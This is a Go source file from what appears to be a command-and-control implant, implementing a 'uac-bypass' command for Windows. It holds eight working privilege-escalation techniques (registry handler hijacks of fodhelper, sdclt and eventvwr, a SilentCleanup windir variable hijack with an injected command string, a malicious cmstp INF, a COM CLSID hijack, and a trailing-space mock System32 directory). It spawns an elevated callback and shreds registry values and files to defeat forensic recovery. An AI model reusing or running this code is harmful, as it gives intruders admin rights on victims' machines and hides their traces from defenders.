//go:build windows
// +build windows

package commands

import (
	crand "crypto/rand"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"time"

	"fawkes/pkg/structs"

	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
)

// UACBypassCommand implements UAC bypass techniques for medium → high integrity escalation
type UACBypassCommand struct{}

func (c *UACBypassCommand) Name() string {
	return "uac-bypass"
}

func (c *UACBypassCommand) Description() string {
	return "Bypass User Account Control to elevate from medium to high integrity"
}

type uacBypassArgs struct {
	Technique string `json:"technique"` // fodhelper, computerdefaults, sdclt, eventvwr, silentcleanup, cmstp, dismhost, wusa
	Command   string `json:"command"`   // command to run elevated (default: self)
}

func (c *UACBypassCommand) Execute(task structs.Task) structs.CommandResult {
	var args uacBypassArgs
	if task.Params != "" {
		if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
			return errorf("Error parsing parameters: %v", err)
		}
	}

	if args.Technique == "" {
		args.Technique = "fodhelper"
	}

	// Check if already elevated — UAC bypass is unnecessary
	if isElevated() {
		return successResult("Already running at high integrity (elevated). UAC bypass not needed.\nUse getsystem to escalate to SYSTEM.")
	}

	// Default: spawn a new copy of ourselves for an elevated callback
	if args.Command == "" {
		exe, err := os.Executable()
		if err != nil {
			return errorf("Error getting executable path: %v", err)
		}
		args.Command = exe
	}

	switch strings.ToLower(args.Technique) {
	case "fodhelper":
		return uacBypassMsSettings(args.Command, resolveSystem32Binary("fodhelper.exe"), "fodhelper")
	case "computerdefaults":
		return uacBypassMsSettings(args.Command, resolveSystem32Binary("computerdefaults.exe"), "computerdefaults")
	case "sdclt":
		return uacBypassSdclt(args.Command)
	case "eventvwr":
		return uacBypassEventvwr(args.Command)
	case "silentcleanup":
		return uacBypassSilentCleanup(args.Command)
	case "cmstp":
		return uacBypassCmstp(args.Command)
	case "dismhost":
		return uacBypassDismhost(args.Command)
	case "wusa":
		return uacBypassWusa(args.Command)
	default:
		return errorf("Unknown technique: %s. Use: fodhelper, computerdefaults, sdclt, eventvwr, silentcleanup, cmstp, dismhost, wusa", args.Technique)
	}
}

// resolveSystem32Binary dynamically resolves a System32 path using
// environment variables instead of hardcoding C:\Windows.
func resolveSystem32Binary(binaryName string) string {
	windir := os.Getenv("WINDIR")
	if windir == "" {
		windir = os.Getenv("SystemRoot")
	}
	if windir == "" {
		windir = `C:\Windows`
	}
	return filepath.Join(windir, "System32", binaryName)
}

// isElevated checks if the current process token is elevated
func isElevated() bool {
	var token windows.Token
	err := windows.OpenProcessToken(windows.CurrentProcess(), windows.TOKEN_QUERY, &token)
	if err != nil {
		return false
	}
	defer token.Close()
	return token.IsElevated()
}

// uacBypassMsSettings implements the ms-settings registry hijack used by both
// fodhelper.exe and computerdefaults.exe. Both auto-elevate and read
// HKCU\Software\Classes\ms-settings\Shell\Open\command for the handler.
func uacBypassMsSettings(command, triggerBinary, techniqueName string) structs.CommandResult {
	var output string
	output += fmt.Sprintf("[*] UAC Bypass Technique: %s\n", techniqueName)
	output += fmt.Sprintf("[*] Trigger binary: %s\n", triggerBinary)
	output += fmt.Sprintf("[*] Elevated command: %s\n\n", command)

	regKeyPath := `Software\Classes\ms-settings\Shell\Open\command`

	// Step 1: Create the registry key and set command
	output += "[*] Step 1: Setting registry key...\n"
	key, _, err := registry.CreateKey(registry.CURRENT_USER, regKeyPath, registry.SET_VALUE)
	if err != nil {
		return errorResult(output + fmt.Sprintf("Error creating HKCU\\%s: %v", regKeyPath, err))
	}

	// Set (Default) value to our command
	if err := key.SetStringValue("", command); err != nil {
		key.Close()
		return errorResult(output + fmt.Sprintf("Error setting command value: %v", err))
	}

	// Set DelegateExecute to empty string — this is critical.
	// Without it, Windows uses the normal ms-settings protocol handler.
	// With an empty DelegateExecute, Windows falls back to the (Default) command value.
	if err := key.SetStringValue("DelegateExecute", ""); err != nil {
		key.Close()
		cleanupMsSettingsKey()
		return errorResult(output + fmt.Sprintf("Error setting DelegateExecute: %v", err))
	}
	key.Close()
	output += fmt.Sprintf("[+] Registry set: HKCU\\%s\n", regKeyPath)

	// Step 2: Launch the auto-elevating trigger binary via ShellExecuteW.
	// Auto-elevating binaries (fodhelper, computerdefaults) have the autoElevate
	// manifest flag. ShellExecuteW triggers the elevation mechanism, while
	// CreateProcessW (exec.Command) fails with ERROR_ELEVATION_REQUIRED on Win11.
	output += "[*] Step 2: Launching trigger binary via ShellExecute...\n"
	verbPtr, _ := windows.UTF16PtrFromString("open")
	filePtr, _ := windows.UTF16PtrFromString(triggerBinary)
	err = windows.ShellExecute(0, verbPtr, filePtr, nil, nil, 0 /* SW_HIDE */)
	if err != nil {
		cleanupMsSettingsKey()
		return errorResult(output + fmt.Sprintf("Error launching %s: %v", triggerBinary, err))
	}
	output += fmt.Sprintf("[+] Launched %s via ShellExecute\n", triggerBinary)

	// Step 3: Wait briefly then clean up registry
	jitterSleep(1500*time.Millisecond, 3*time.Second)
	output += "[*] Step 3: Cleaning up registry (shredding values)...\n"
	cleanupMsSettingsKey()
	output += "[+] Registry keys shredded and removed\n\n"

	output += "[+] UAC bypass triggered successfully.\n"
	output += "[*] If successful, a new elevated callback should appear shortly.\n"
	output += "[*] The elevated process runs at high integrity (admin)."

	return successResult(output)
}

// cleanupMsSettingsKey shreds values and removes the ms-settings hijack registry keys
func cleanupMsSettingsKey() {
	keyPath := `Software\Classes\ms-settings\Shell\Open\command`
	shredRegistryKey(registry.CURRENT_USER, keyPath)
	// Delete parent keys (deepest first)
	_ = registry.DeleteKey(registry.CURRENT_USER, `Software\Classes\ms-settings\Shell\Open`)
	_ = registry.DeleteKey(registry.CURRENT_USER, `Software\Classes\ms-settings\Shell`)
	_ = registry.DeleteKey(registry.CURRENT_USER, `Software\Classes\ms-settings`)
}

// uacBypassSdclt implements the sdclt.exe Folder handler hijack.
// sdclt.exe auto-elevates and reads HKCU\Software\Classes\Folder\shell\open\command.
func uacBypassSdclt(command string) structs.CommandResult {
	sdcltPath := resolveSystem32Binary("sdclt.exe")

	var output string
	output += "[*] UAC Bypass Technique: sdclt\n"
	output += fmt.Sprintf("[*] Trigger binary: %s\n", sdcltPath)
	output += fmt.Sprintf("[*] Elevated command: %s\n\n", command)

	regKeyPath := `Software\Classes\Folder\shell\open\command`

	// Step 1: Create the registry key and set command
	output += "[*] Step 1: Setting registry key...\n"
	key, _, err := registry.CreateKey(registry.CURRENT_USER, regKeyPath, registry.SET_VALUE)
	if err != nil {
		return errorResult(output + fmt.Sprintf("Error creating HKCU\\%s: %v", regKeyPath, err))
	}

	// Set (Default) value to our command
	if err := key.SetStringValue("", command); err != nil {
		key.Close()
		return errorResult(output + fmt.Sprintf("Error setting command value: %v", err))
	}

	// DelegateExecute must be set (empty string) for the Folder handler too
	if err := key.SetStringValue("DelegateExecute", ""); err != nil {
		key.Close()
		cleanupSdcltKey()
		return errorResult(output + fmt.Sprintf("Error setting DelegateExecute: %v", err))
	}
	key.Close()
	output += fmt.Sprintf("[+] Registry set: HKCU\\%s\n", regKeyPath)

	// Step 2: Launch sdclt.exe via ShellExecuteW (same reason as ms-settings: auto-elevate needs ShellExecute)
	output += "[*] Step 2: Launching sdclt.exe via ShellExecute...\n"
	verbPtr, _ := windows.UTF16PtrFromString("open")
	filePtr, _ := windows.UTF16PtrFromString(sdcltPath)
	err = windows.ShellExecute(0, verbPtr, filePtr, nil, nil, 0 /* SW_HIDE */)
	if err != nil {
		cleanupSdcltKey()
		return errorResult(output + fmt.Sprintf("Error launching sdclt.exe: %v", err))
	}
	output += "[+] Launched sdclt.exe via ShellExecute\n"

	// Step 3: Wait briefly then clean up registry
	jitterSleep(1500*time.Millisecond, 3*time.Second)
	output += "[*] Step 3: Cleaning up registry (shredding values)...\n"
	cleanupSdcltKey()
	output += "[+] Registry keys shredded and removed\n\n"

	output += "[+] UAC bypass triggered successfully.\n"
	output += "[*] If successful, a new elevated callback should appear shortly.\n"
	output += "[*] The elevated process runs at high integrity (admin)."

	return successResult(output)
}

// cleanupSdcltKey shreds values and removes the Folder handler hijack registry keys
func cleanupSdcltKey() {
	keyPath := `Software\Classes\Folder\shell\open\command`
	shredRegistryKey(registry.CURRENT_USER, keyPath)
	_ = registry.DeleteKey(registry.CURRENT_USER, `Software\Classes\Folder\shell\open`)
	_ = registry.DeleteKey(registry.CURRENT_USER, `Software\Classes\Folder\shell`)
	// Don't delete Software\Classes\Folder — it may have legitimate content
}

// shredRegistryValue overwrites a registry string value with random data 3 times
// before deleting it. This defeats forensic recovery of deleted registry values
// from hive slack space (RegRipper, Registry Explorer, Volatility).
func shredRegistryValue(key registry.Key, valueName string) {
	for i := 0; i < 3; i++ {
		_ = key.SetStringValue(valueName, randomShredString())
	}
	_ = key.DeleteValue(valueName)
}

// shredRegistryKey opens a registry key, shreds all its string values, then
// deletes the key. Falls back to plain DeleteKey if the key can't be opened
// for writing (e.g., insufficient permissions).
func shredRegistryKey(hive registry.Key, path string) {
	key, err := registry.OpenKey(hive, path, registry.SET_VALUE|registry.QUERY_VALUE)
	if err != nil {
		// Can't open for writing — just try to delete
		_ = registry.DeleteKey(hive, path)
		return
	}
	names, err := key.ReadValueNames(-1)
	if err == nil {
		for _, name := range names {
			shredRegistryValue(key, name)
		}
	}
	key.Close()
	_ = registry.DeleteKey(hive, path)
}

// randomShredString generates a random 64-character string for registry
// value overwriting. Uses crypto/rand for unpredictable content.
func randomShredString() string {
	const charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
	b := make([]byte, 64)
	_, _ = crand.Read(b)
	for i := range b {
		b[i] = charset[b[i]%byte(len(charset))]
	}
	return string(b)
}

// uacBypassEventvwr implements the Event Viewer (eventvwr.exe) mscfile handler hijack.
// eventvwr.exe auto-elevates and opens eventvwr.msc. The .msc file association is
// resolved via HKCU\Software\Classes\mscfile\Shell\Open\command. Hijacking this
// key causes the elevated eventvwr.exe to launch our command instead.
func uacBypassEventvwr(command string) structs.CommandResult {
	eventvwrPath := resolveSystem32Binary("eventvwr.exe")

	var output string
	output += "[*] UAC Bypass Technique: eventvwr\n"
	output += fmt.Sprintf("[*] Trigger binary: %s\n", eventvwrPath)
	output += fmt.Sprintf("[*] Elevated command: %s\n\n", command)

	regKeyPath := `Software\Classes\mscfile\Shell\Open\command`

	// Step 1: Create the registry key and set command
	output += "[*] Step 1: Setting registry key...\n"
	key, _, err := registry.CreateKey(registry.CURRENT_USER, regKeyPath, registry.SET_VALUE)
	if err != nil {
		return errorResult(output + fmt.Sprintf("Error creating HKCU\\%s: %v", regKeyPath, err))
	}

	// Set (Default) value to our command
	if err := key.SetStringValue("", command); err != nil {
		key.Close()
		return errorResult(output + fmt.Sprintf("Error setting command value: %v", err))
	}
	key.Close()
	output += fmt.Sprintf("[+] Registry set: HKCU\\%s\n", regKeyPath)

	// Step 2: Launch eventvwr.exe via ShellExecuteW (auto-elevate triggers mscfile handler)
	output += "[*] Step 2: Launching eventvwr.exe via ShellExecute...\n"
	verbPtr, _ := windows.UTF16PtrFromString("open")
	filePtr, _ := windows.UTF16PtrFromString(eventvwrPath)
	err = windows.ShellExecute(0, verbPtr, filePtr, nil, nil, 0 /* SW_HIDE */)
	if err != nil {
		cleanupEventvwrKey()
		return errorResult(output + fmt.Sprintf("Error launching eventvwr.exe: %v", err))
	}
	output += "[+] Launched eventvwr.exe via ShellExecute\n"

	// Step 3: Wait briefly then clean up registry
	jitterSleep(1500*time.Millisecond, 3*time.Second)
	output += "[*] Step 3: Cleaning up registry (shredding values)...\n"
	cleanupEventvwrKey()
	output += "[+] Registry keys shredded and removed\n\n"

	output += "[+] UAC bypass triggered successfully.\n"
	output += "[*] If successful, a new elevated callback should appear shortly.\n"
	output += "[*] The elevated process runs at high integrity (admin)."

	return successResult(output)
}

// cleanupEventvwrKey shreds values and removes the mscfile hijack registry keys
func cleanupEventvwrKey() {
	keyPath := `Software\Classes\mscfile\Shell\Open\command`
	shredRegistryKey(registry.CURRENT_USER, keyPath)
	_ = registry.DeleteKey(registry.CURRENT_USER, `Software\Classes\mscfile\Shell\Open`)
	_ = registry.DeleteKey(registry.CURRENT_USER, `Software\Classes\mscfile\Shell`)
	_ = registry.DeleteKey(registry.CURRENT_USER, `Software\Classes\mscfile`)
}

// uacBypassSilentCleanup exploits the SilentCleanup scheduled task which runs
// with highest privileges. The task action uses %windir%\system32\cleanmgr.exe.
// By overriding the windir environment variable in HKCU\Environment, we control
// what gets executed when the task expands the variable.
func uacBypassSilentCleanup(command string) structs.CommandResult {
	var output string
	output += "[*] UAC Bypass Technique: silentcleanup\n"
	output += fmt.Sprintf("[*] Elevated command: %s\n\n", command)

	// Step 1: Set HKCU\Environment\windir to hijack the variable expansion.
	// The SilentCleanup task runs: %windir%\system32\cleanmgr.exe /autoclean /d %systemdrive%
	// We set windir to: cmd /c start "" "<command>" &REM
	// Which expands to: cmd /c start "" "<command>" &REM\system32\cleanmgr.exe ...
	// The &REM comments out the rest after running our command.
	output += "[*] Step 1: Setting environment variable override...\n"
	hijackValue := fmt.Sprintf(`cmd /c start "" "%s" &REM `, command)

	envKey, _, err := registry.CreateKey(registry.CURRENT_USER, `Environment`, registry.SET_VALUE|registry.QUERY_VALUE)
	if err != nil {
		return errorResult(output + fmt.Sprintf("Error opening HKCU\\Environment: %v", err))
	}

	// Save the original windir value (if any user-level override exists) for restoration
	origWindir, _, origErr := envKey.GetStringValue("windir")
	hasOrigWindir := origErr == nil

	if err := envKey.SetStringValue("windir", hijackValue); err != nil {
		envKey.Close()
		return errorResult(output + fmt.Sprintf("Error setting windir override: %v", err))
	}
	envKey.Close()
	output += "[+] Set HKCU\\Environment\\windir override\n"

	// Step 2: Trigger the SilentCleanup scheduled task
	output += "[*] Step 2: Triggering SilentCleanup scheduled task...\n"
	schtasksPath := resolveSystem32Binary("schtasks.exe")
	taskResultBytes, _ := execCmdTimeoutOutput(schtasksPath, "/run", "/tn", `\Microsoft\Windows\DiskCleanup\SilentCleanup`)
	taskResult := string(taskResultBytes)
	if strings.Contains(taskResult, "SUCCESS") || strings.Contains(taskResult, "successfully") {
		output += "[+] SilentCleanup task triggered\n"
	} else {
		// Task may still work even without SUCCESS message — continue with cleanup
		output += fmt.Sprintf("[!] Task trigger returned: %s\n", strings.TrimSpace(taskResult))
		output += "[*] Continuing with cleanup (task may still execute)...\n"
	}

	// Step 3: Wait briefly then restore the environment
	jitterSleep(2*time.Second, 4*time.Second)
	output += "[*] Step 3: Restoring environment variable...\n"
	envKey, err = registry.OpenKey(registry.CURRENT_USER, `Environment`, registry.SET_VALUE)
	if err == nil {
		if hasOrigWindir {
			_ = envKey.SetStringValue("windir", origWindir)
		} else {
			_ = envKey.DeleteValue("windir")
		}
		envKey.Close()
	}
	output += "[+] Environment variable restored\n\n"

	output += "[+] UAC bypass triggered successfully.\n"
	output += "[*] If successful, a new elevated callback should appear shortly.\n"
	output += "[*] The elevated process runs at high integrity (admin)."

	return successResult(output)
}

// uacBypassCmstp exploits cmstp.exe (Connection Manager Profile Installer) to
// execute commands with elevated privileges. An INF file with a
// RunPreSetupCommandsSection is crafted and passed to cmstp.exe /au which
// auto-elevates and executes the commands from the INF.
func uacBypassCmstp(command string) structs.CommandResult {
	var output string
	output += "[*] UAC Bypass Technique: cmstp\n"
	output += fmt.Sprintf("[*] Elevated command: %s\n\n", command)

	// Step 1: Write a malicious INF file to temp directory
	output += "[*] Step 1: Writing INF file...\n"
	tempDir := os.TempDir()
	infPath := filepath.Join(tempDir, fmt.Sprintf("CMSTP_%s.inf", randomShredString()[:8]))

	infContent := fmt.Sprintf(`[version]
Signature=$chicago$
AdvancedINF=2.5

[DefaultInstall_SingleUser]
UnRegisterOCXs=UnRegisterOCXSection

[UnRegisterOCXSection]
%%11%%\scrobj.dll,NI,%s

[Strings]
ServiceName="VPN"
ShortSvcName="VPN"
`, command)

	if err := os.WriteFile(infPath, []byte(infContent), 0600); err != nil {
		return errorResult(output + fmt.Sprintf("Error writing INF file: %v", err))
	}
	output += fmt.Sprintf("[+] INF file written: %s\n", infPath)

	// Step 2: Launch cmstp.exe with the INF file
	// /au = all users (triggers elevation), /s = silent
	output += "[*] Step 2: Launching cmstp.exe...\n"
	cmstpPath := resolveSystem32Binary("cmstp.exe")
	verbPtr, _ := windows.UTF16PtrFromString("open")
	filePtr, _ := windows.UTF16PtrFromString(cmstpPath)
	argsPtr, _ := windows.UTF16PtrFromString("/au " + infPath)
	shellErr := windows.ShellExecute(0, verbPtr, filePtr, argsPtr, nil, 0 /* SW_HIDE */)
	if shellErr != nil {
		// Shred and remove INF file on failure
		shredData := make([]byte, len(infContent)+64)
		_, _ = crand.Read(shredData)
		_ = os.WriteFile(infPath, shredData, 0600)
		_ = os.Remove(infPath)
		return errorResult(output + fmt.Sprintf("Error launching cmstp.exe: %v", shellErr))
	}
	output += "[+] Launched cmstp.exe /au via ShellExecute\n"

	// Step 3: Wait briefly then clean up the INF file
	jitterSleep(2*time.Second, 4*time.Second)
	output += "[*] Step 3: Cleaning up INF file...\n"

	// Shred the INF file content before deletion (overwrite with random data)
	shredData := make([]byte, len(infContent)+64)
	_, _ = crand.Read(shredData)
	_ = os.WriteFile(infPath, shredData, 0600)
	_ = os.Remove(infPath)
	output += "[+] INF file shredded and removed\n\n"

	output += "[+] UAC bypass triggered successfully.\n"
	output += "[*] If successful, a new elevated callback should appear shortly.\n"
	output += "[*] Note: cmstp.exe may briefly display a UI element — this is expected."

	return successResult(output)
}

// uacBypassDismhost exploits the DISM Package Manager COM object (CLSID
// {3ad05575-8857-4850-9277-11b85bdb8e09}) by registering a LocalServer32
// handler in HKCU. When pkgmgr.exe auto-elevates and CoCreates this CLSID,
// COM resolution checks HKCU first and launches our command at high integrity.
func uacBypassDismhost(command string) structs.CommandResult {
	pkgmgrPath := resolveSystem32Binary("pkgmgr.exe")

	var output string
	output += "[*] UAC Bypass Technique: dismhost (COM CLSID hijack)\n"
	output += fmt.Sprintf("[*] Trigger binary: %s\n", pkgmgrPath)
	output += fmt.Sprintf("[*] Elevated command: %s\n\n", command)

	// DISM Package Manager COM CLSID
	clsid := `{3ad05575-8857-4850-9277-11b85bdb8e09}`
	clsidKeyPath := `Software\Classes\CLSID\` + clsid
	localServerPath := clsidKeyPath + `\LocalServer32`

	// Step 1: Create HKCU CLSID registration with LocalServer32 pointing to our command
	output += "[*] Step 1: Registering COM CLSID hijack in HKCU...\n"
	key, _, err := registry.CreateKey(registry.CURRENT_USER, localServerPath, registry.SET_VALUE)
	if err != nil {
		return errorResult(output + fmt.Sprintf("Error creating HKCU\\%s: %v", localServerPath, err))
	}
	if err := key.SetStringValue("", command); err != nil {
		key.Close()
		return errorResult(output + fmt.Sprintf("Error setting LocalServer32 value: %v", err))
	}
	key.Close()
	output += fmt.Sprintf("[+] COM CLSID registered: HKCU\\%s\n", localServerPath)

	// Step 2: Launch pkgmgr.exe via ShellExecuteW to trigger auto-elevation + COM activation
	output += "[*] Step 2: Launching pkgmgr.exe via ShellExecute...\n"
	verbPtr, _ := windows.UTF16PtrFromString("open")
	filePtr, _ := windows.UTF16PtrFromString(pkgmgrPath)
	err = windows.ShellExecute(0, verbPtr, filePtr, nil, nil, 0 /* SW_HIDE */)
	if err != nil {
		cleanupDismhostKey(clsid)
		return errorResult(output + fmt.Sprintf("Error launching pkgmgr.exe: %v", err))
	}
	output += "[+] Launched pkgmgr.exe via ShellExecute\n"

	// Step 3: Wait briefly then clean up the CLSID registration
	jitterSleep(2*time.Second, 4*time.Second)
	output += "[*] Step 3: Cleaning up COM CLSID registration (shredding)...\n"
	cleanupDismhostKey(clsid)
	output += "[+] CLSID keys shredded and removed\n\n"

	output += "[+] UAC bypass triggered successfully.\n"
	output += "[*] If successful, a new elevated callback should appear shortly.\n"
	output += "[*] The elevated process runs at high integrity (admin)."

	return successResult(output)
}

// cleanupDismhostKey shreds values and removes the COM CLSID hijack registry keys
func cleanupDismhostKey(clsid string) {
	basePath := `Software\Classes\CLSID\` + clsid
	shredRegistryKey(registry.CURRENT_USER, basePath+`\LocalServer32`)
	_ = registry.DeleteKey(registry.CURRENT_USER, basePath+`\LocalServer32`)
	_ = registry.DeleteKey(registry.CURRENT_USER, basePath)
}

// uacBypassWusa exploits the mock trusted directory technique (historically
// associated with wusa.exe for file extraction). Creates a directory with a
// trailing space ("C:\Windows \System32\") that passes Windows auto-elevation
// path validation (GetLongPathNameW strips trailing spaces). An auto-elevating
// binary copied to this mock directory runs elevated from user-writable space,
// combined with the ms-settings registry hijack for command execution.
//
// Note: The original wusa.exe /extract technique (UACME method 2) was patched
// in Windows 10 1607+. This implementation uses the mock trusted directory
// evolution of that technique, which remains effective on current Windows versions.
func uacBypassWusa(command string) structs.CommandResult {
	var output string
	output += "[*] UAC Bypass Technique: wusa (mock trusted directory)\n"
	output += fmt.Sprintf("[*] Elevated command: %s\n\n", command)

	windir := os.Getenv("WINDIR")
	if windir == "" {
		windir = os.Getenv("SystemRoot")
	}
	if windir == "" {
		windir = `C:\Windows`
	}

	// Use \\?\ prefix to create directory with trailing space.
	// Standard Windows API normalizes away trailing spaces; \\?\ bypasses this.
	mockWindowsDir := `\\?\` + windir + ` `
	mockSystem32Dir := mockWindowsDir + `\System32`

	// The auto-elevating binary to copy into the mock directory.
	// computerdefaults.exe is reliable and uses ms-settings protocol handler.
	sourceBinary := resolveSystem32Binary("computerdefaults.exe")
	destBinary := windir + ` \System32\computerdefaults.exe`

	// Step 1: Create the mock trusted directory structure
	output += "[*] Step 1: Creating mock trusted directory...\n"

	// Create "C:\Windows \" (with trailing space) — user-writable
	if err := createDirectoryW(mockWindowsDir); err != nil {
		return errorResult(output + fmt.Sprintf("Error creating mock Windows dir: %v", err))
	}
	output += fmt.Sprintf("[+] Created: %s\n", windir+` `)

	// Create "C:\Windows \System32\"
	if err := createDirectoryW(mockSystem32Dir); err != nil {
		cleanupWusaDirectory(mockWindowsDir, windir)
		return errorResult(output + fmt.Sprintf("Error creating mock System32 dir: %v", err))
	}
	output += fmt.Sprintf("[+] Created: %s\\System32\n", windir+` `)

	// Step 2: Copy the auto-elevating binary to the mock directory
	output += "[*] Step 2: Copying auto-elevating binary to mock directory...\n"
	if err := copyFileSimple(sourceBinary, destBinary); err != nil {
		cleanupWusaDirectory(mockWindowsDir, windir)
		return errorResult(output + fmt.Sprintf("Error copying %s: %v", filepath.Base(sourceBinary), err))
	}
	output += fmt.Sprintf("[+] Copied %s to mock System32\n", filepath.Base(sourceBinary))

	// Step 3: Set up ms-settings registry hijack (same as fodhelper/computerdefaults technique)
	output += "[*] Step 3: Setting ms-settings registry hijack...\n"
	regKeyPath := `Software\Classes\ms-settings\Shell\Open\command`
	key, _, err := registry.CreateKey(registry.CURRENT_USER, regKeyPath, registry.SET_VALUE)
	if err != nil {
		cleanupWusaDirectory(mockWindowsDir, windir)
		return errorResult(output + fmt.Sprintf("Error creating HKCU\\%s: %v", regKeyPath, err))
	}
	if err := key.SetStringValue("", command); err != nil {
		key.Close()
		cleanupWusaDirectory(mockWindowsDir, windir)
		return errorResult(output + fmt.Sprintf("Error setting command value: %v", err))
	}
	if err := key.SetStringValue("DelegateExecute", ""); err != nil {
		key.Close()
		cleanupMsSettingsKey()
		cleanupWusaDirectory(mockWindowsDir, windir)
		return errorResult(output + fmt.Sprintf("Error setting DelegateExecute: %v", err))
	}
	key.Close()
	output += fmt.Sprintf("[+] Registry set: HKCU\\%s\n", regKeyPath)

	// Step 4: Launch the copied binary from the mock directory.
	// Windows auto-elevation check resolves "C:\Windows \System32\computerdefaults.exe"
	// via GetLongPathNameW which strips the trailing space, making the path appear as
	// "C:\Windows\System32\computerdefaults.exe" — a trusted location. This passes the
	// elevation check, so the binary auto-elevates. The elevated binary then reads the
	// HKCU ms-settings handler and executes our command at high integrity.
	output += "[*] Step 4: Launching from mock directory via ShellExecute...\n"
	verbPtr, _ := windows.UTF16PtrFromString("open")
	filePtr, _ := windows.UTF16PtrFromString(destBinary)
	err = windows.ShellExecute(0, verbPtr, filePtr, nil, nil, 0 /* SW_HIDE */)
	if err != nil {
		cleanupMsSettingsKey()
		cleanupWusaDirectory(mockWindowsDir, windir)
		return errorResult(output + fmt.Sprintf("Error launching from mock directory: %v", err))
	}
	output += "[+] Launched computerdefaults.exe from mock trusted directory\n"

	// Step 5: Wait briefly then clean up everything
	jitterSleep(2*time.Second, 4*time.Second)
	output += "[*] Step 5: Cleaning up...\n"
	cleanupMsSettingsKey()
	output += "[+] Registry keys shredded and removed\n"
	cleanupWusaDirectory(mockWindowsDir, windir)
	output += "[+] Mock trusted directory removed\n\n"

	output += "[+] UAC bypass triggered successfully.\n"
	output += "[*] If successful, a new elevated callback should appear shortly.\n"
	output += "[*] The elevated process runs at high integrity (admin)."

	return successResult(output)
}

// createDirectoryW creates a directory using the Windows API directly,
// supporting \\?\ prefix paths for directory names with trailing spaces.
func createDirectoryW(path string) error {
	pathPtr, err := windows.UTF16PtrFromString(path)
	if err != nil {
		return err
	}
	return windows.CreateDirectory(pathPtr, nil)
}

// copyFileSimple copies a file from src to dst using binary read/write
func copyFileSimple(src, dst string) error {
	data, err := os.ReadFile(src)
	if err != nil {
		return err
	}
	return os.WriteFile(dst, data, 0755)
}

// cleanupWusaDirectory removes the mock trusted directory tree including all files.
// Uses \\?\ prefix paths to handle directories with trailing spaces.
func cleanupWusaDirectory(mockWindowsDir, windir string) {
	// Remove the copied binary from System32 subdirectory
	destBinary := `\\?\` + windir + ` \System32\computerdefaults.exe`
	removeFileW(destBinary)

	// Remove System32 subdirectory
	system32Dir := mockWindowsDir + `\System32`
	removeDirectoryW(system32Dir)

	// Remove the mock Windows directory
	removeDirectoryW(mockWindowsDir)
}

// removeFileW deletes a file using Windows API to support \\?\ prefix paths
func removeFileW(path string) {
	pathPtr, err := windows.UTF16PtrFromString(path)
	if err != nil {
		return
	}
	_ = windows.DeleteFile(pathPtr)
}

// removeDirectoryW deletes a directory using Windows API to support \\?\ prefix paths
func removeDirectoryW(path string) {
	pathPtr, err := windows.UTF16PtrFromString(path)
	if err != nil {
		return
	}
	_ = windows.RemoveDirectory(pathPtr)
}
